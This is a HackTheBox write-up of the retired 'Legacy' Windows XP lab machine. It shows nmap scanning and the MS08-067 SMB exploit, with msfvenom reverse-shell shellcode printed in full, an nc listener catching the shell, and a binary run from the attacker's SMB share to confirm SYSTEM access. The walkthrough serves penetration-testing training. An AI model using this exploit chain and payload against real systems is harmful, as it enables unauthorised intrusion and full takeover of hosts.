---
title: "Legacy (Easy-Windows Machine)"
date: 2022-04-18T19:32:35+08:00
draft: false
tags: ["HackTheBox"] 
---

{{<image src="/HTB_Card/Legacy.png" position="center" style="border-radius: 8px;">}}

This machine in HackTheBox is rated Easy. It encourage me to do a vuln scan on the open port. Personally I feel `scanning` is important for this box because if you miss a certain scan, you will miss out the vulnerability. I was stuck for a few hours because I dont know where to look for after the attempt to list the shared directory fail.

Machine IP: 10.10.10.4; Machine Author: ch4p

## Scanning 

Let us start by scanning using Nmap to find any opened ports in the machine.

```
sudo nmap -p- -A 10.10.10.4 -oN tcp.scan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 11:52 BST
Nmap scan report for 10.10.10.4
Host is up (0.0066s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (93%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (93%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP2 or Windows Small Business Server 2003 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5d00h27m41s, deviation: 2h07m16s, median: 4d22h57m41s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c1:5f (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-04-23T15:52:43+03:00

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   11.67 ms 10.10.14.1
2   10.69 ms 10.10.10.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.79 seconds
```

From the scan, it tells us that 2 ports is open:

- Samba = Port 139 and 445

## Enumeration 

Knowing that Samba Port is open, i tried to check for any shared directory but both came up nothing when i use `smbclient` and `smbmap` to check: 

```
┌──(kali㉿kali)-[~/HacktheBox/Retired Machine/Legacy]
└─$ smbclient -L \\\\10.10.10.4\\                                       
Enter WORKGROUP\kali's password: 
session setup failed: NT_STATUS_INVALID_PARAMETER
                                                                               
┌──(kali㉿kali)-[~/HacktheBox/Retired Machine/Legacy]
└─$ smbmap -H 10.10.10.4                                                
[+] IP: 10.10.10.4:445	Name: 10.10.10.4
```

So the next thing I'll do is to scan for any vuln script that I can use for the open ports:

```
nmap -Pn --script=vuln -p 139,445 -oN vuln.scan 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 07:30 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4
Host is up (0.0024s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 48.92 seconds
```

If we look at the output closely, the open ports are vulnerable to both `MS08-067` and `MS17-010`. Which we can pull from `Github` for exploit later.

## Initial Foothold and ... Root

#### MS08-067

I will be focusing more on using `MS08-067` exploit. This exploit is quite old and need some tinker here and there a bit before it can really work. I will be using [this](https://github.com/andyacer/ms08_067) exploit from Github. 

> You'll need to update Kali's Impacket version to 0_9_17 or above to use this.

Let clone the repo to our working directory and run the exploit: 

```
git clone https://github.com/andyacer/ms08_067.git
Cloning into 'ms08_067'...
remote: Enumerating objects: 37, done.
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37
Receiving objects: 100% (37/37), 13.01 KiB | 13.01 MiB/s, done.
Resolving deltas: 100% (11/11), done.

python3 ms08_067_2018.py                                                                                                                            1 ⨯
  File "/home/kali/HacktheBox/Retired Machine/Legacy/ms08_067/ms08_067_2018.py", line 13
    except ImportError, _:
                      ^
SyntaxError: invalid syntax
```

Realise when we run it with `python3` it will tell us invalid syntax. Running it on `python2` will give us another headache on installing the `impacket` when by right we don't have to install it anymore. The kali update should ship with it (I GUESS ????). Anyway, I will use `2to3-2.7` command to convert the existing script to support or run using `python3`: 

```
2to3-2.7 ms08_067_2018.py -w                                                                                                                        1 ⨯
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal
RefactoringTool: Skipping optional fixer: ws_comma
RefactoringTool: Refactored ms08_067_2018.py
--- ms08_067_2018.py	(original)
+++ ms08_067_2018.py	(refactored)
...

# Below this will change the script to suit python3
```

Once done, we should see 2 copies of the script. Running the script now with `python3` will show us that its working correctly: 

```
python3 ms08_067_2018.py 
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################


Usage: ms08_067_2018.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

Also: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
```

Nice ! This is what I want to see. Reading the script, I need to generate a payload for it to connect back to me using msfvenom. The payload can be found in the script itself: 

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.42 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] = 
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x39\x97\xc7\x90\x83\xee\xfc\xe2\xf4\xc5\x7f\x45\x90\x39\x97"
"\xa7\x19\xdc\xa6\x07\xf4\xb2\xc7\xf7\x1b\x6b\x9b\x4c\xc2\x2d"
"\x1c\xb5\xb8\x36\x20\x8d\xb6\x08\x68\x6b\xac\x58\xeb\xc5\xbc"
"\x19\x56\x08\x9d\x38\x50\x25\x62\x6b\xc0\x4c\xc2\x29\x1c\x8d"
"\xac\xb2\xdb\xd6\xe8\xda\xdf\xc6\x41\x68\x1c\x9e\xb0\x38\x44"
"\x4c\xd9\x21\x74\xfd\xd9\xb2\xa3\x4c\x91\xef\xa6\x38\x3c\xf8"
"\x58\xca\x91\xfe\xaf\x27\xe5\xcf\x94\xba\x68\x02\xea\xe3\xe5"
"\xdd\xcf\x4c\xc8\x1d\x96\x14\xf6\xb2\x9b\x8c\x1b\x61\x8b\xc6"
"\x43\xb2\x93\x4c\x91\xe9\x1e\x83\xb4\x1d\xcc\x9c\xf1\x60\xcd"
"\x96\x6f\xd9\xc8\x98\xca\xb2\x85\x2c\x1d\x64\xff\xf4\xa2\x39"
"\x97\xaf\xe7\x4a\xa5\x98\xc4\x51\xdb\xb0\xb6\x3e\x68\x12\x28"
"\xa9\x96\xc7\x90\x10\x53\x93\xc0\x51\xbe\x47\xfb\x39\x68\x12"
"\xc0\x69\xc7\x97\xd0\x69\xd7\x97\xf8\xd3\x98\x18\x70\xc6\x42"
"\x50\xfa\x3c\xff\xcd\x9a\x37\xbd\xaf\x92\x39\x65\xf7\x19\xdf"
"\xfd\xd7\xc6\x6e\xff\x5e\x35\x4d\xf6\x38\x45\xbc\x57\xb3\x9c"
"\xc6\xd9\xcf\xe5\xd5\xff\x37\x25\x9b\xc1\x38\x45\x51\xf4\xaa"
"\xf4\x39\x1e\x24\xc7\x6e\xc0\xf6\x66\x53\x85\x9e\xc6\xdb\x6a"
"\xa1\x57\x7d\xb3\xfb\x91\x38\x1a\x83\xb4\x29\x51\xc7\xd4\x6d"
"\xc7\x91\xc6\x6f\xd1\x91\xde\x6f\xc1\x94\xc6\x51\xee\x0b\xaf"
"\xbf\x68\x12\x19\xd9\xd9\x91\xd6\xc6\xa7\xaf\x98\xbe\x8a\xa7"
"\x6f\xec\x2c\x27\x8d\x13\x9d\xaf\x36\xac\x2a\x5a\x6f\xec\xab"
"\xc1\xec\x33\x17\x3c\x70\x4c\x92\x7c\xd7\x2a\xe5\xa8\xfa\x39"
"\xc4\x38\x45";
```

Now, copy the payload that we just generated and replace the existing payload in the script. I will be using `mousepad` to update the script file. Once done, I can now run `nc` to recieve the shell after running the script:

```
# Terminal 1 (Set up listener)

nc -lvnp 62000         
listening on [any] 62000 ...

# Terminal 2 (Run the exploit)

python3 ms08_067_2018.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

# Back to Terminal 1 

nc -lvnp 62000
listening on [any] 62000 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.4] 1031
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

And we got shell! For those of you who is wondering how I get the version right, when I did the `initial.scan` earlier, I see `Windows XP` there. So pay attention to scans too! 

## Post Exploitation 

Alright since I got a shell back, the first thing I will check is `whoami` in the system. This will usually tell us if we get as a normal user or administrator. For this machine, we get this back: 

```
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

Now usually when we run this command on our PC Command Prompt, we will get back a result stating that you are currently as this user but not for this machine. So I will show how to do it. 

First we locate where is our `smbserver.py` and `whoami.exe` in the `kali` system. After locating it, we copy the `whoami.exe` binary to our currenty directory and host the file:

```
# Locating smbserver.py and whoami.exe

locate smbserver.py; locate whoami.exe
/usr/lib/python3/dist-packages/impacket/smbserver.py 
/usr/share/doc/python3-impacket/examples/smbserver.py <-- Use this 
/usr/share/windows-resources/binaries/whoami.exe <-- Copy this to current directory 

# Copy whoami.exe to current directory
cp /usr/share/windows-resources/binaries/whoami.exe . 

# Run smbserver.py on the current directory 
python3 /usr/share/doc/python3-impacket/examples/smbserver.py fspxnky .
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

> If cannot locate the file, try run `sudo updatedb` first and try again. If not you have to download the file manually. 

Now, lets execute the binary from our reverse window shell by doing this: 

```
C:\WINDOWS\system32>\\10.10.14.42\fspxnky\whoami.exe
\\10.10.14.42\fspxnky\whoami.exe
NT AUTHORITY\SYSTEM
```

Well .. It says we are `NT AUTHORITY\SYSTEM`, means root/adminstrator! Flag are in administrator and john desktop folder!



